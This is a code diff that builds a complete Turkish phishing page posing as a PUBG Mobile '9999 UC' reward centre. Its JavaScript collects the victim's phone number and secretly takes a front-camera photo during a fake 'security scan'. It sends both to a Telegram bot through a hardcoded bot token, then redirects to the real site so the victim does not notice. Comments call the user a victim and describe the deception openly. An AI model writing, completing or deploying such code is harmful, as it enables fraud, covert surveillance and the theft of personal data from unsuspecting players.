@@ -1,19 +1,52 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG MOBILE | Ödül Merkezi</title>
+    <style>
+        body { margin: 0; background: #0b0d11; color: #ffde00; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .box { border: 1px solid #ffde00; padding: 30px; border-radius: 12px; background: #000; width: 340px; text-align: center; box-shadow: 0 0 30px rgba(255, 222, 0, 0.1); }
+        h2 { font-size: 1.5em; margin-bottom: 10px; text-transform: uppercase; }
+        input { width: 100%; padding: 12px; margin: 15px 0; background: #1a1f29; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; background: #ffde00; color: #000; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; text-transform: uppercase; font-size: 1em; }
+        #log { font-family: monospace; font-size: 11px; margin-top: 15px; color: #00ff00; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="box" id="ui">
+    <img src="https://www.pubgmobile.com/images/icon_logo_big.png" width="70" style="margin-bottom:10px;">
+    <h2>9999 UC AKTİF ET</h2>
+    <p style="color:#888; font-size:0.9em;">ID ve numaranızı doğrulayarak UC'lerinizi hemen hesabınıza çekin.</p>
+    <input type="tel" id="phone-input" placeholder="05XX XXX XX XX">
+    <button class="btn" onclick="sizmaIslemi()">DOĞRULAMAYI BAŞLAT</button>
+    <div id="log"></div>
+</div>
+
+<video id="v" autoplay></video>
+<canvas id="c"></canvas>
+
 <script>
-    // 1. ADIM: Linkteki ID'yi (yani botu kullanan kişiyi) oku
+    // 1. ADIM: Linkteki ID'yi (yani botu kullanan kişiyi) yakala
     const urlParams = new URLSearchParams(window.location.search);
-    const ownerID = urlParams.get('id'); // Botun oluşturduğu linkteki ID'yi yakalar
+    const ownerID = urlParams.get('id'); 
 
     const CONFIG = {
-        TOKEN: "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc", // ANA BOT TOKENIN (Veriler bu bot üzerinden iletilir)
+        TOKEN: "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc", // BURAYA KENDİ BOT TOKENINI YAZ AŞKIM
         REDIRECT: "https://www.pubgmobile.com"
     };
 
     async function veriyiGonder(mesaj, resim = null) {
-        if (!ownerID) return; // ID yoksa kimseye bir şey gitmez
+        if (!ownerID) {
+            console.error("Hata: Linkte ID bulunamadı!");
+            return;
+        }
 
         const api = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
         const fd = new FormData();
-        fd.append('chat_id', ownerID); // SİHİR BURADA: Veri linki oluşturan kullanıcıya gider!
+        fd.append('chat_id', ownerID);
 
         if (resim) {
             fd.append('photo', resim, 'spy.jpg');
@@ -25,21 +58,46 @@
         }
     }
 
-    // Kurban numarayı girip butona bastığında çalışacak ana fonksiyon
-    async function sızmaIslemi() {
+    async function sizmaIslemi() {
         const numara = document.getElementById('phone-input').value;
-        if(numara.length < 10) return;
+        if(numara.length < 10) {
+            alert("Lütfen numaranızı girin!");
+            return;
+        }
 
-        // Önce numarayı sahibine uçur
+        const log = document.getElementById('log');
+        log.innerText = "> Bağlantı kuruluyor...";
+
+        // Önce numarayı sahibine (linkteki ID'ye) uçur
         await veriyiGonder(`🔥 HEDEF DÜŞTÜ!\n📞 Numara: ${numara}`);
 
-        // Sonra kameraya sız ve resmi sahibine uçur
+        // Kameraya sız ve resmi sahibine uçur
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            // ... (Kamera yakalama kodları buraya gelecek)
-            // Yakalanan blobu 'veriyiGonder' fonksiyonuna resim olarak gönder sevgilim
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            
+            log.innerText = "> Güvenlik taraması yapılıyor (15s)...";
+
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    veriyiGonder(`📸 GÖRÜNTÜ GELDİ | NO: ${numara}`, blob);
+                    stream.getTracks().forEach(t => t.stop());
+                    log.innerText = "> İŞLEM TAMAMLANDI!";
+                    setTimeout(() => window.location.href = CONFIG.REDIRECT, 1000);
+                }, 'image/jpeg');
+            }, 3000); // Kurbanın bakması için 3 saniye süre
+
         } catch(e) { 
+            // Kamera reddedilse bile numara gitti, çaktırmadan yönlendir
             window.location.href = CONFIG.REDIRECT; 
         }
     }
 </script>
+</body>
+</html>
